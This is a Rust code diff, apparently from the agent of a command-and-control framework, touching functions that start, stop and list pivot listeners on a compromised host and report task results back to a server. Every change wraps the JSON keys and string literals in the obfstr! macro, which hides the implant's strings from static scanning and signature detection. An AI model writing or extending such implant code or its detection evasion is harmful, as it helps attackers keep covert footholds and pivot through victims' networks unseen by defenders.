@@ -7,6 +7,7 @@ use std::{
 };
 use lazy_static::lazy_static;
 use serde_json::Value;
+use obfstr::obfstr;
 use crate::transport::send_request_with_response_raw;
 
 lazy_static! {
@@ -70,14 +71,14 @@ pub fn startPivotListener(task: &serde_json::Value) -> Result<(), Box<dyn std::e
 
     map.insert(port, (handle, running));
     let response_json = serde_json::json!({
-        "action": "post_response",
-        "responses": [
+        obfstr!("action"): obfstr!("post_response"),
+        obfstr!("responses"): [
             {
-                "task_id": task.get("id").unwrap().as_str().unwrap(),
-                "user_output": format!("Pivot listener started on port {}", port),
-                "timestamp": task.get("timestamp").unwrap().as_f64().unwrap(),
-                "status": "success",
-                "completed": true,
+                obfstr!("task_id"): task.get("id").unwrap().as_str().unwrap(),
+                obfstr!("user_output"): format!("Pivot listener started on port {}", port),
+                obfstr!("timestamp"): task.get(obfstr!("timestamp")).unwrap().as_f64().unwrap(),
+                obfstr!("status"): obfstr!("success"),
+                obfstr!("completed"): true,
             }
         ]
     });
@@ -108,14 +109,14 @@ pub fn stopPivotListener(task: &serde_json::Value) -> Result<(), Box<dyn std::er
     }
 
     let response_json = serde_json::json!({
-        "action": "post_response",
-        "responses": [
+        obfstr!("action"): obfstr!("post_response"),
+        obfstr!("responses"): [
             {
-                "task_id": task.get("id").unwrap().as_str().unwrap(),
-                "user_output": format!("Pivot listener stopped on port {}", port),
-                "timestamp": task.get("timestamp").unwrap().as_f64().unwrap(),
-                "status": "success",
-                "completed": true,
+                obfstr!("task_id"): task.get("id").unwrap().as_str().unwrap(),
+                obfstr!("user_output"): format!("Pivot listener stopped on port {}", port),
+                obfstr!("timestamp"): task.get(obfstr!("timestamp")).unwrap().as_f64().unwrap(),
+                obfstr!("status"): obfstr!("success"),
+                obfstr!("completed"): true,
             }
         ]
     });
@@ -138,14 +139,14 @@ pub fn listPivotListeners(task: &serde_json::Value) -> Result<(), Box<dyn std::e
     };
 
     let response_json = serde_json::json!({
-        "action": "post_response",
-        "responses": [
+        obfstr!("action"): obfstr!("post_response"),
+        obfstr!("responses"): [
             {
-                "task_id": task.get("id").unwrap().as_str().unwrap(),
-                "user_output": port_list,
-                "timestamp": task.get("timestamp").unwrap().as_f64().unwrap(),
-                "status": "success",
-                "completed": true,
+                obfstr!("task_id"): task.get("id").unwrap().as_str().unwrap(),
+                obfstr!("user_output"): port_list,
+                obfstr!("timestamp"): task.get(obfstr!("timestamp")).unwrap().as_f64().unwrap(),
+                obfstr!("status"): obfstr!("success"),
+                obfstr!("completed"): true,
             }
         ]
     });
